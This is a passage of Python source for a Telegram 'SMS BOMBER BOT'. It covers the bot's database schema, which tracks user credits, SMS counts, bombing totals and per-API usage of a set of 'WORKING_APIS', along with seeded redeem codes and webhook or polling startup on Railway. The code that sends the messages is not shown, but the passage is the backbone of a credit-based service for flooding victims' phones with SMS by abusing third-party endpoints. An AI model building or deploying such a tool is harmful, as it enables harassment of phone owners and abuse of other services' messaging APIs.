            await db.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 10, total_sms INTEGER DEFAULT 0, total_bombing INTEGER DEFAULT 0, join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active')")
            await db.execute("CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, amount INTEGER, usages INTEGER, created_by INTEGER, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            await db.execute("CREATE TABLE IF NOT EXISTS redeem_history (user_id INTEGER, code TEXT, redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, code))")
            await db.execute("CREATE TABLE IF NOT EXISTS api_usage (id INTEGER PRIMARY KEY AUTOINCREMENT, api_name TEXT, user_id INTEGER, success INTEGER, usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            await db.execute("CREATE TABLE IF NOT EXISTS api_stats (api_name TEXT PRIMARY KEY, total_calls INTEGER DEFAULT 0, total_success INTEGER DEFAULT 0, total_failed INTEGER DEFAULT 0, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            await db.execute("CREATE TABLE IF NOT EXISTS user_api_stats (user_id INTEGER, api_name TEXT, total_calls INTEGER DEFAULT 0, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, api_name))")
            await db.execute("CREATE TABLE IF NOT EXISTS admin_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, admin_id INTEGER, action TEXT, target_id INTEGER, details TEXT, log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50',50,100,?)", (ADMIN_ID,))
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10',10,200,?)", (ADMIN_ID,))
            await db.commit()
            logger.info("Database initialized")
    except Exception as e:
        logger.error(f"DB init error: {e}")

# ===================== WEBHOOK SETUP (FINAL FIX) =====================
async def main():
    try:
        print("=" * 60)
        print("SMS BOMBER BOT STARTING WITH WEBHOOK...")
        print(f"APIs: {len(WORKING_APIS)}")
        print(f"Admin: {ADMIN_ID}")
        print(f"DB: {DB_PATH}")
        print("=" * 60)
        
        await init_db()
        asyncio.create_task(backup_database())
        
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("Bot is RUNNING with Webhook!")
        print("=" * 60)
        
        # Railway provides a public URL via PORT
        port = int(os.getenv('PORT', 8080))
        webhook_url = f"https://{os.getenv('RAILWAY_STATIC_URL', 'localhost')}/webhook"
        
        # If RAILWAY_STATIC_URL is not set, use polling as fallback
        if os.getenv('RAILWAY_STATIC_URL'):
            await app.bot.set_webhook(webhook_url)
            await app.run_webhook(listen="0.0.0.0", port=port, webhook_url=webhook_url)
        else:
            # Fallback to polling
            print("No RAILWAY_STATIC_URL, using polling...")
            await app.initialize()
            await app.start()
            await app.updater.start_polling()
            
            while True:
                await asyncio.sleep(3600)
            
    except Exception as e:
        logger.error(f"Main error: {e}")
        print(f"Error: {e}")
        raise

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Stopped!")
    except Exception as e:
        print(f"Fatal: {e}")
